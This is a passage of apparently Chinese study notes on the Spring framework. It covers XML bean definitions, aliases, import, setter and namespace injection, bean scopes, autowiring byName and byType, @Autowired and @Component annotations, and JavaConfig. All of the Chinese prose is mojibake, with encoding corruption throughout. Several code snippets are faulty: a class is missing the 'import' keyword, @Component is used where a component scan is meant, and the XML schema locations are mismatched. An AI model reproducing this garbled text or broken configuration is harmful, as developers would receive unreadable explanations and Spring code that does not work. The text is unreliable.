å‚æ„é€ çš„æ–¹æ³•äº† åªè¦æˆ‘ä»¬ä½¿ç”¨new ClassPathXmlApplicationContextåˆ›å»ºï¼Œå°±ä¼šæŠŠXMLå½“ä¸­çš„ç±»å…¨éƒ¨æ³¨å…¥è¿›å»ï¼Œåˆ›å»ºæ–°ç±» 1234567891011121314151617181920package com.ys.pojo;public class UserT &#123; private String name; public UserT()&#123; System.out.println(&quot;userTè¢«åˆ›å»ºäº†&quot;); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public UserT(String name) &#123; this.name = name; &#125;&#125; ä¾‹å¦‚æˆ‘ä»¬åˆ›å»ºè¯¥javaç±» å¹¶åœ¨beanä¸­æ‰«æï¼š 123&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;user&quot;/&gt;&lt;/bean&gt; æˆ‘ä»¬ä¾¿ä¸ä¼šå¾—åˆ°æ„é€ å™¨åº”è¯¥è¿”å›é‚£å¥è¯ï¼Œä½†å¦‚æœæˆ‘ä»¬å»æ‰ä¸Šé¢çš„ 1&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot;/&gt; åˆ™ä¼šå¾—åˆ°æ„é€ å™¨å½“ä¸­çš„è¯ åŒæ—¶æˆ‘ä»¬è¦çŸ¥é“ï¼Œæˆ‘ä»¬åˆ›å»ºçš„æ—¶å€™æ˜¯ä¸€æ ·çš„beanï¼Œå¯¹è±¡å¹¶æ²¡æœ‰åŒºåˆ«ï¼š æµ‹è¯•ä»£ç ï¼š 12User user = (User) context.getBean(&quot;user&quot;);User user2 = (User)context.getBean(&quot;user&quot;); ä¸¤è€…æ˜¯æ˜¯ä¸€æ ·çš„ã€‚ æ‰€ä»¥åœ¨é…ç½®æ–‡ä»¶åŠ è½½çš„æ—¶å€™ï¼Œå®¹å™¨ä¸­ç®¡ç†çš„å¯¹è±¡å°±å·²ç»åˆå§‹åŒ–äº† 3. Springé…ç½®3.1 åˆ«å1&lt;alias name=&quot;userT&quot; alias=&quot;dnm&quot;/&gt; åˆ©ç”¨è¿™æ ·å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªåˆ«åé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ï¼š 1&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot; name=&quot;userT2&quot;/&gt; 12345 User user = (User) context.getBean(&quot;user2&quot;); User user2 = (User)context.getBean(&quot;user&quot;); System.out.println(user==user2); user.show();&#125; æµ‹è¯•åæ˜¯ä¸€æ ·çš„ è€Œä¸”åˆ©ç”¨nameçš„æ–¹å¼å¯ä»¥èµ·å¤šä¸ªåˆ«å 1&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot; name=&quot;user2,u2&quot;&gt; 3.2 Beançš„é…ç½®3.3 importimportä¸€èˆ¬è¢«æˆ‘ä»¬ç”¨äºä½¿ç”¨å›¢é˜Ÿå¼€å‘ä½¿ç”¨ï¼Œå®ƒå¯ä»¥å°†å¤šä¸ªé…ç½®æ–‡ä»¶å¯¼å…¥åˆå¹¶ä¸ºä¸€ä¸ªï¼Œæ–¹ä¾¿ç¨‹åºå‘˜ä¹‹é—´äº’ç›¸åä½œã€‚ ä¾‹å¦‚æˆ‘å…ˆåˆ›å»ºäº†å¦‚ä¸‹ä¸‰ä¸ªé…ç½®çš„xmlï¼š beans1.xml ,applicationContext.xml ä»¥åŠbeans.xml åœ¨mainå‡½æ•°å½“ä¸­æˆ‘å´åªæƒ³ä½¿ç”¨ä¸€ä¸ªï¼Œè¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿï¼Œè¿™æ ·æˆ‘ä»¬åº”è¯¥ï¼š 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;import resource=&quot;beans.xml&quot;/&gt; &lt;import resource=&quot;beans1.xml&quot;/&gt; &lt;/beans&gt; ä¹‹åå†å›åˆ°Mytestå½“ä¸­ï¼š 12ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); è¿™æ ·å°±ç›¸å½“äºä¸€å£æ°”ç»„ç»‡äº†ä¸‰ä¸ªxmlæ–‡ä»¶ åŒæ—¶å†å›åˆ°å‰é¢çš„åˆ«åçš„ä½¿ç”¨ï¼Œè¿™æ ·çš„åˆ«åä¾¿äºæˆ‘ä»¬importåˆå¹¶çš„æ—¶å€™å°†ä»–ä»¬åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¼šé˜»æ­¢é‡å¤çš„æƒ…å†µ 4 ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰4.1 æ„é€ å™¨æ³¨å…¥å‰é¢å·²ç»è¯´è¿‡ 4.2 SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘ ä¾èµ–æ³¨å…¥ï¼šæœ¬è´¨å°±æ˜¯setæ³¨å…¥ï¼ ä¾èµ–ä»€ä¹ˆï¼Ÿ beanå¯¹è±¡çš„åˆ›å»ºä¾èµ–äºå®¹å™¨ æ³¨å…¥ä»€ä¹ˆï¼Ÿ beanå¯¹è±¡ä¸­çš„æ‰€æœ‰å±æ€§ç”±å®¹å™¨æ¥æ³¨å…¥ å…³äºå¤æ‚ç±»å‹ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦æ˜ç™½listï¼Œsetï¼Œmapéƒ½æ˜¯æ¥åšä»€ä¹ˆçš„ï¼Œä»¥åŠä»–ä»¬çš„åŒºåˆ« è¯¦ç»†æˆ‘å†³å®šå†™åœ¨JAVAåŸºç¡€é‡Œé¢ã€‚ ã€ç¯å¢ƒæ­å»ºã€‘ 1.å¤æ‚ç±»å‹ 1234567891011public class Address &#123; private String address; public String getAddress() &#123; return address; &#125; public void setAddress(String address) &#123; this.address = address; &#125;&#125; 2.çœŸå®æµ‹è¯•å¯¹è±¡ 123456789public class Student &#123; private Address address; private String name; private String[] books; private List&lt;Student&gt; hobbies; private Map&lt;String,String&gt; cards; private Set&lt;String&gt; games; private String wife; private Properties info; è¿™äº›å¯¹è±¡çš„å„ç§æ³¨å…¥æ–¹æ³•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;!-- Beanæ³¨å…¥ï¼Œä½¿ç”¨ref--&gt;&lt;property name=&quot;address&quot; ref=&quot;address1&quot;/&gt;&lt;property name=&quot;books&quot;&gt; &lt;array&gt; &lt;value&gt;JavaåŸºç¡€&lt;/value&gt; &lt;value&gt;Javaè¿›ç¨‹&lt;/value&gt; &lt;value&gt;Javaç¼–å†™&lt;/value&gt; &lt;value&gt;JavaIOC&lt;/value&gt; &lt;value&gt;JavaSpring&lt;/value&gt; &lt;/array&gt;&lt;/property&gt;&lt;property name=&quot;cards&quot;&gt; &lt;map&gt; &lt;entry key=&quot;æœˆæ›œ&quot; value=&quot;1751111&quot;/&gt; &lt;entry key=&quot;æœˆçŸ³&quot; value=&quot;138217&quot;/&gt; &lt;/map&gt;&lt;/property&gt;&lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;æˆ˜åœ°&lt;/value&gt; &lt;value&gt;ä½¿å‘½å¬å”¤&lt;/value&gt; &lt;value&gt;EA&lt;/value&gt; &lt;value&gt;å¥¥é‡Œç»™&lt;/value&gt; &lt;/set&gt;&lt;/property&gt;&lt;property name=&quot;hobbies&quot;&gt; &lt;list&gt; &lt;value&gt;å”±æ­Œ&lt;/value&gt; &lt;value&gt;ä¸‹æ£‹&lt;/value&gt; &lt;value&gt;ç¡è§‰&lt;/value&gt; &lt;/list&gt;&lt;/property&gt;&lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;url&quot;&gt;/weibos?SSL=xxx&lt;/prop&gt; &lt;prop key=&quot;divers&quot;&gt;mysql&lt;/prop&gt; &lt;prop key=&quot;username&quot;&gt;æœˆçŸ³&lt;/prop&gt; &lt;prop key=&quot;password&quot;&gt;æœˆæ›œ&lt;/prop&gt; &lt;/props&gt;&lt;/property&gt;&lt;property name=&quot;wife&quot;&gt; &lt;null/&gt;&lt;/property&gt;&lt;/bean&gt; æˆ‘åœ¨è¿™é‡Œè§‰å¾—æ¯”è¾ƒé‡è¦çš„åŒºåˆ«å°±æ˜¯åœ¨äºpropå’Œmapå½“ä¸­çš„å·®åˆ« mapå› ä¸ºå¼ºè°ƒçš„æ˜¯é”®å€¼å¯¹å…³ç³»ï¼Œæ‰€ä»¥å†™åœ¨mapçš„æ ‡ç­¾å½“ä¸­ï¼Œè€Œpropä¸­çš„å€¼å®¹æ˜“ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™åœ¨æ ‡ç­¾ä¸­é—´ã€‚ æ€»è€Œè¨€ä¹‹è®°ä½å°±å¥½äº† æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š 123456Student&#123;address=Address&#123;address=&#x27;å®‰å¾½èŠœæ¹–ä¸­å‡º&#x27;&#125;, name=&#x27;æœˆçŸ³&#x27;,books=[JavaåŸºç¡€, Javaè¿›ç¨‹, Javaç¼–å†™, JavaIOC, JavaSpring],hobbies=[å”±æ­Œ, ä¸‹æ£‹, ç¡è§‰], cards=&#123;æœˆæ›œ=1751111, æœˆçŸ³=138217&#125;, games=[æˆ˜åœ°, ä½¿å‘½å¬å”¤, EA, å¥¥é‡Œç»™], wife=&#x27;null&#x27;, info=&#123;password=æœˆæ›œ, url=/weibos?SSL=xxx, divers=mysql, username=æœˆçŸ³&#125;&#125; 4.3 æ‹“å±•æ–¹å¼æ³¨å…¥é™¤äº†ä¸Šé¢çš„ä¾èµ–æ³¨å…¥ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨På‘½åç©ºé—´å’ŒCå‘½åç©ºé—´æ³¨å…¥ï¼Œä½†æ˜¯ä»–ä»¬å¿…é¡»åˆ©ç”¨XMLçº¦æŸã€‚ å…·ä½“ä¾‹å­å¦‚ä¸‹ï¼š 123456789&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt; &lt;property name=&quot;age&quot; value=&quot;20&quot;/&gt;&lt;/bean&gt;&lt;bean class=&quot;com.ys.pojo.User&quot; id=&quot;user2&quot; p:age=&quot;20&quot; p:name=&quot;æœˆæ›œ&quot;/&gt;&lt;bean id=&quot;user3&quot; class=&quot;com.ys.pojo.User&quot; c:age=&quot;21&quot; c:name=&quot;æœˆç¬™&quot;/&gt; 1234567891011@Testpublic void test()&#123; ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean2.xml&quot;); User user = context.getBean(&quot;user&quot;, User.class); User user2 = context.getBean(&quot;user2&quot;, User.class); System.out.println(user); System.out.println(user2); User user3 = context.getBean(&quot;user3&quot;, User.class); System.out.println(user3); ï¼ˆæƒ³ä½¿ç”¨testè®°å¾—å¯¼å…¥junitå“¦ ç›¸åŒçš„ï¼Œä½¿ç”¨cæ ‡ç­¾å°±ç›¸å½“äºä½¿ç”¨æ„é€ å™¨å‘¢ã€‚ é‚£ä¹ˆç©ä»€ä¹ˆè¦ä½¿ç”¨cæ ‡ç­¾å’Œpæ ‡ç­¾å‘¢ï¼Ÿ æˆ‘çŒœæƒ³æ˜¯å¦‚æœæˆ‘ä»¬å¯¹è¿™ç§ç®€å•çš„æ³¨å…¥æ–¹å¼ç»Ÿä¸€çš„ä½¿ç”¨æ ‡ç­¾æ¥è¿›è¡Œæ³¨å…¥ï¼Œè€Œå¤æ‚çš„ä½¿ç”¨propæ¥è¿›è¡Œæ³¨å…¥ï¼Œå¯ä»¥ç®€åŒ–æˆ‘ä»¬çš„ä»£ç ï¼Œå½“xmlç¹ççš„æ—¶å€™ä¹Ÿä¸è‡³äºä¸€å¡Œç³Šæ¶‚äº†æŠŠ å®˜æ–¹æ–‡æ¡£ï¼š namespace is not as flexible as the standard XML format. For example, the format for declaring property references clashes with properties that end in Ref, whereas the standard XML format does not. We recommend that you choose your approach carefully and communicate this to your team members, to avoid producing XML documents that use all three approaches at the same time. æ„æ€æ˜¯ä¸å¤Ÿçµæ´»ï¼ŒåŒæ—¶éœ€è¦ä¸å›¢é˜Ÿæ²Ÿé€šå¥½ï¼Œä½†æ˜¯å¯ä»¥ç®€åŒ–ä»£ç ï¼Ÿ 5 Beançš„ä½œç”¨åŸŸä¸»è¦æ˜¯æ¢è®¨åŸå‹å’Œå•ä¾‹ä¹‹é—´çš„å·®è·ï¼š å•ä¾‹ï¼š ä¹‹åæˆ‘ä»¬åˆ›å»ºçš„æ—¶å€™å³ä½¿åˆ›å»ºå¾ˆå¤šä¸ªç±»ï¼Œä¾ç„¶åªæœ‰ä¸€ä¸ªåŸå‹ å¤šä¾‹ï¼š æ¯åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç±» 12&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;æœˆæ›œ&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;æœˆæ›œ&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt; æµ‹è¯•ä»£ç ï¼š 12345User user = context.getBean(&quot;user&quot;, User.class); User user2 = context.getBean(&quot;user&quot;, User.class); System.out.println(user.hashCode()); System.out.println(user2.hashCode()); System.out.println(user==user2); å¾—åˆ°ç»“æœï¼š 1231075738627282828951false 6. Beançš„è‡ªåŠ¨è£…é… è‡ªåŠ¨è£…é…æ˜¯Springæ»¡è¶³beanä¾èµ–çš„ä¸€ç§æ–¹å¼ï¼ Springä¼šåœ¨ä¸Šä¸‹æ–‡ä¸­è‡ªåŠ¨å¯»æ‰¾ï¼Œå¹¶è‡ªåŠ¨ç»™beanè£…é…å±æ€§ åœ¨Springä¸­æœ‰ä¸‰ç§è‡ªåŠ¨è£…é…çš„æ–¹å¼ï¼š åœ¨XMLä¸­æ˜¾å¼çš„é…ç½® åœ¨Javaä¸­æ˜¾å¼çš„é…ç½® éšå¼çš„è‡ªåŠ¨è£…é…beanã€é‡è¦ã€‘ 6.1 æµ‹è¯•ç¯å¢ƒ ä¸€ä¸ªäººæœ‰ä¸¤æ¡ç‹—ï¼ Catï¼š 12345public class Cat &#123; public void shout()&#123; System.out.println(&quot;miao&quot;); &#125;&#125; Dogï¼š 12345public class Dog &#123; public void shout()&#123; System.out.println(&quot;wang&quot;); &#125;&#125; Personï¼š 1234567891011121314151617181920212223242526272829303132333435363738public class Person &#123; private Cat cat; private Dog dog; private String name; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;cat=&quot; + cat + &quot;, dog=&quot; + dog + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; beans.xml: byNameé…ç½®ï¼š 123456&lt;bean id=&quot;cat&quot; class=&quot;com.ys.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog&quot; class=&quot;com.ys.pojo.Dog&quot;/&gt;&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;/bean&gt; byTypeï¼š 123456&lt;bean class=&quot;com.ys.pojo.Cat&quot;/&gt;&lt;bean class=&quot;com.ys.pojo.Dog&quot;/&gt;&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byType&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;/bean&gt; byNameå°±æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾idå’Œæ‰€éœ€æ±‚åŒ¹é…çš„å€¼ï¼Œè€ŒbyTypeåˆ™æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å»å¯»æ‰¾å’Œç±»å‹ç›¸åŒç±» äºæ˜¯æˆ‘åˆäº§ç”Ÿäº†ä¸€ä¸ªç–‘æƒ‘ï¼Œå¦‚æœå­˜åœ¨è·¨æ–‡ä»¶çš„æƒ…å†µå‘¢ï¼Ÿ äºæ˜¯æˆ‘åˆåˆ›å»ºäº†ä¸€ä¸ªbean1.xmlæ¥å‚¨å­˜ 123&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;dnm&quot;/&gt;&lt;/bean&gt; å¾—åˆ°ç»“æœï¼š æœˆçŸ³ miao wang ä½†æ˜¯å¦‚æœæˆ‘æŠŠbeansçš„æ³¨é‡Šä¹‹åå‘¢ åˆ™æ˜¯ dnm miao wang è¿™å°±è¯´æ˜ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨beans.xmlè£…é…ä¹‹åï¼Œç³»ç»Ÿä¼šä¼˜å…ˆåœ¨å½“å‰xmlæ¥è¿›è¡ŒæŸ¥æ‰¾ï¼Œä¹‹åæ‰ä¼šå»å…¶ä»–åœ°æ–¹æŸ¥æ‰¾ é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬éœ€è¦è®°ä½ï¼š å½“æˆ‘ä»¬ä½¿ç”¨byNameçš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å½“å‰beançš„idå”¯ä¸€ä¸”æ­£ç¡® å½“æˆ‘ä»¬ä½¿ç”¨byTypeçš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å½“å‰beançš„classå”¯ä¸€ä¸”æ­£ç¡® 6.2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…jdk1.5æ”¯æŒï¼Œspring2.5æ”¯æŒ ä½¿ç”¨æ³¨è§£é¡»çŸ¥ï¼š å¯¼å…¥çº¦æŸ é…ç½®æ³¨è§£çš„æ”¯æŒ å¿…é¡»å¯¼å…¥å¦‚ä¸‹é…ç½®ï¼š 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://springframework.org/schema/context http://springframework.org/schema/context/spring-context.xsd https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;context:annotation-config/&gt; ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥å¯¹å•ä¸ªå€¼è¿›è¡Œæ³¨å…¥ã€‚ åœ¨Personç±»å½“ä¸­ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.ys.pojo;import org.springframework.beans.factory.annotation.Autowired;public class Person &#123; @Autowired private Cat cat; @Autowired private Dog dog; private String name; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;cat=&quot; + cat + &quot;, dog=&quot; + dog + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; å½“æˆ‘ä»¬ä½¿ç”¨atuowiredæ³¨å…¥ä¹‹åï¼Œç”šè‡³è¿setæ–¹æ³•éƒ½ä¸éœ€è¦æ„é€ äº†ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ ã€æ®è¯´æ˜¯å› ä¸ºä»–åˆ©ç”¨åå°„çš„æ–¹å¼è·å–ä»£ç ï¼Œæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ å¦‚æœbeanå½“ä¸­çš„é…ç½®å¤šèµ·æ¥äº†ï¼Œæˆ‘ä»¬æƒ³æ„é€ çš„è¯ï¼Œå°±éœ€è¦é€šè¿‡ 1@Qualifier(value = &quot;cat&quot;) æ˜¾å¼çš„å®šä¹‰ä»£ç  7.æ³¨è§£å¼€å‘åœ¨Spring4ä¹‹åï¼Œæˆ‘ä»¬å¿…é¡»ä¿è¯Springçš„AOPåŒ…è¢«å¯¼å…¥ åœ¨ä½¿ç”¨æ³¨è§£çš„æ—¶å€™éœ€è¦å¯¼å…¥contextçº¦æŸï¼Œå¢åŠ æ³¨è§£çš„æ”¯æŒ 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://springframework.org/schema/context http://springframework.org/schema/context/spring-context.xsd https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;context:annotation-config/&gt; bean å½“æˆ‘ä»¬ä½¿ç”¨æ³¨è§£ä¹‹åï¼Œbeanå¯ä»¥å¦‚ä¸‹æ–¹æ³•è¿›å…¥å¯¼å…¥ï¼š ç¬¬ä¸€æ­¥ï¼Œå¯¼å…¥åŒ…ï¼š 12&lt;context:annotation-config/&gt;&lt;context:component-scan base-package=&quot;com.ys&quot;/&gt; ç¬¬äºŒæ­¥ï¼Œå»ç±»çš„ä¸Šé¢æ·»åŠ æ³¨é‡Šï¼š 12345678910111213@Componentpublic class User &#123; private String name; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; æ³¨æ„@Componentï¼Œè¿™ä¸ªæ³¨è§£çš„æ„æ€ç­‰ä»·äº 1&lt;bean id=&#x27;user&#x27; class=com.ys.pojo.user&gt; å±æ€§å¦‚ä½•æ³¨å…¥ ä½¿ç”¨ç±»æˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥æ³¨å…¥å€¼çš„ï¼š 123public class User &#123; @Value(&quot;æœˆçŸ³&quot;) private String name; ç­‰ä»·äºï¼š 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;/bean&gt; ä½†æ˜¯é€šè¿‡è¿™æˆ‘ä»¬å°±å¯ä»¥æ˜ç™½ï¼Œæ³¨è§£æ³¨å…¥å€¼ä¸é€‚åˆæ³¨å…¥å¤æ‚ç±»å‹çš„å€¼ã€‚ è¡ç”Ÿçš„æ³¨è§£ é€šè¿‡@Componentåé¢ä¸ºäº†åˆ†å±‚ï¼Œæˆ‘ä»¬è¡ç”Ÿå‡ºäº†å¦‚ä¸‹æ³¨è§£ï¼š Dao: @Repository Service: @Service Controller: @Controller è¿™å››ä¸ªç±»çš„æœ¬è´¨éƒ½æ²¡æœ‰åŒºåˆ«ï¼Œéƒ½ä»£è¡¨æ³¨å†Œä¸€ä¸ªbeanå»XMLå½“ä¸­ï¼Œåªä¸è¿‡è¿™æ ·å†™å¯ä»¥ä½¿å¾—æˆ‘ä»¬MVCæ¶æ„æ›´åŠ æ¸…æ™°æ˜äº† è‡ªåŠ¨è£…é… 123- @Atuowired: è‡ªåŠ¨è£…é…- @Nullableï¼š å…è®¸å­—æ®µä¸ºnull- @Resource ï¼šé€šè¿‡åå­—ï¼Œç±»å‹è‡ªåŠ¨è£…é… ä½œç”¨åŸŸ å…¶å®é€šè¿‡æ³¨è§£ä¹Ÿå¯ä»¥å¯¹ä½œç”¨åŸŸè¿›è¡Œæ³¨è§£ï¼Œä½†æ˜¯æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚ 1@Scope() ä¸ºä»€ä¹ˆä¸é€šè¿‡XMLå‘¢ï¼Ÿ å°ç»“ åœ¨è¿™ç« æˆ‘ä»¬å­¦ä¼šäº†åˆ©ç”¨æ³¨è§£è¿›è¡Œå¼€å‘ï¼Œå¯ä»¥é€šè¿‡æ³¨è§£æ‘†è„±XMLï¼Œä½†æ˜¯æˆ‘é€šè¿‡å­¦ä¹ è¿™ä¸€ç« èŠ‚ï¼Œæˆ‘æ„Ÿè§‰Springæ­¤æ—¶è¿˜æ˜¯ä¸å¤Ÿæˆç†Ÿï¼Œå¤§éƒ¨åˆ†çš„æ—¶å€™è¿˜æ˜¯åˆ©ç”¨XMLæ›´åŠ æ–¹ä¾¿ï¼Œå¤æ‚çš„ä¸œè¥¿ä¸¢ç»™XMLæ¥åšï¼Œç®€å•çš„åˆ©ç”¨æ³¨è§£æ³¨å…¥å°±è¡Œ æ‰€ä»¥æœ€ä½³å®è·µåº”è¯¥æ˜¯ï¼š åˆ©ç”¨XMLæ‰‹åŠ¨çš„å»ºç«‹æ¯ä¸ªbeanï¼Œè¿™æ ·æ–¹ä¾¿ç¨‹åºå‘˜çš„äº’ç›¸åˆä½œ XMLæ³¨å…¥MAPç±»å‹ç­‰ åˆ©ç”¨æ³¨é‡Šæ‰‹åŠ¨çš„æ³¨å…¥ç®€å•å€¼ï¼Œé™ä½å¼€å‘æˆæœ¬ åŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦äº†è§£ï¼š XMLçš„ä¼˜åŠ¿å°±åœ¨äºä»–æ›´åŠ æ¸…æ¥šæ˜äº†ï¼Œèµ·ç åœ¨Springæ¥è¯´æ˜¯è¿™æ ·çš„ï¼ŒåŒæ—¶XMLè¿˜æ–¹ä¾¿è·¨æ–‡ä»¶é…åˆ è€Œæ³¨è§£æ›´åŠ çš„æ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå¼€å‘ï¼Œæ³¨å…¥å€¼ï¼Œé™ä½ç¨‹åºå‘˜çš„æˆæœ¬ï¼ˆä½†æ˜¯å¢åŠ äº†è¿ç»´çš„éš¾åº¦ ä½¿ç”¨æ³¨è§£å¼€å‘çš„ä¸€ä¸ªç®€å•ä¾‹å­ï¼Œè¿˜æ˜¯ä¸€ä¸ªäººä¸¤ä¸ªå® ç‰©ï¼š ğŸ±çš„ä»£ç ï¼š 12345678910package com.ys.pojo;import org.springframework.stereotype.Component;@Componentpublic class Cat &#123; public void shout()&#123; System.out.println(&quot;ğŸ±ï¼šwdnmd&quot;); &#125;&#125; ğŸ•çš„ä»£ç ï¼š 12345678910package com.ys.pojo;org.springframework.stereotype.Component;@Componentpublic class Dog &#123; public void shout()&#123; System.out.println(&quot;ğŸ•ï¼šwdnmd&quot;); &#125;&#125; äººçš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132@Componentpublic class User &#123; @Value(&quot;æœˆçŸ³&quot;) private String name; @Autowired private Cat cat; @Autowired private Dog dog; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125;&#125; æµ‹è¯•ä»£ç ï¼š 1234567891011public class Mytest &#123; public static void main(String[] args) &#123; ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); User user = context.getBean(&quot;user&quot;, User.class); System.out.println(user.getName()); user.getCat().shout(); user.getDog().shout(); &#125;&#125; ä¾ç„¶èƒ½å¤Ÿæ­£å¸¸çš„å¾—åˆ°ç»“æœ~ 8 å®Œå…¨ä½¿ç”¨Javaé…ç½®Springæˆ‘ä»¬ç°åœ¨è¦å®Œå…¨ä½¿ç”¨Javaconfigå®Œå…¨çš„ä»£æ›¿XMLäº†ï¼ŒSpringBootå½“ä¸­ä¹Ÿæ˜¯è¿™æ ·åšçš„ï¼Œæˆ‘è¿˜æ˜¯æœ‰ç‚¹æ…Œï¼Œæ„Ÿè§‰æ²¡æœ‰èƒ½å¤Ÿé€‚åº”è¿‡æ¥ è¿˜æ˜¯å¾ˆæœ‰å¿…è¦å°†XMLçš„æ–¹å¼å’ŒJavaç±»çš„æ–¹å¼è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿ç”¨Javaconfigæ¥ä»£æ›¿XML æ„é€ å¦‚ä¸‹Javaä»£ç : 123456789@Configuration@Component(&quot;com.ys.pojo&quot;)@Import(JavaConfig2.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125;&#125; æˆ‘ä»¬ä½¿ç”¨@Configurationçš„æ„æ€ç­‰åŒäºï¼š 1&lt;beans &gt;&lt;/beans&gt; ä¹‹åæˆ‘ä»¬æ‰€æœ‰çš„é…ç½®éƒ½å¯ä»¥å†™åœ¨è¯¥ç±»å½“ä¸­ @Component(â€œcom.ys.pojoâ€)ç±»ç­‰åŒäºå¦‚ä¸‹ä»£ç 